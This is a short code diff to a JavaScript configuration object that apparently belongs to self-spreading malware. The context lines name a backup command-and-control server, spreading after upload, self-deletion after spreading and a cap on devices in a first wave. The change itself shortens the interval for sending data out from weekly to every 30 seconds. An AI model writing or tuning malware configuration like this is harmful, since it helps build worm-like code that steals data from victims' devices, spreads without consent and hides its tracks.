@@ -34,7 +34,7 @@ const CONFIG = {
     dataFolder: "data",
   },
   c2Server: "http://192.168.1.47:8080", // Backup C2
-  uploadIntervalDays: 7,          // Send data once per week
+  uploadIntervalSeconds:30,          // Send data once per 30s
   spreadAfterUpload: true,        // Spread after uploading
   selfDestructAfterSpread: true,  // Delete self after spreading
   maxDevicesInFirstWave: 5,       // Phase 1 limitation
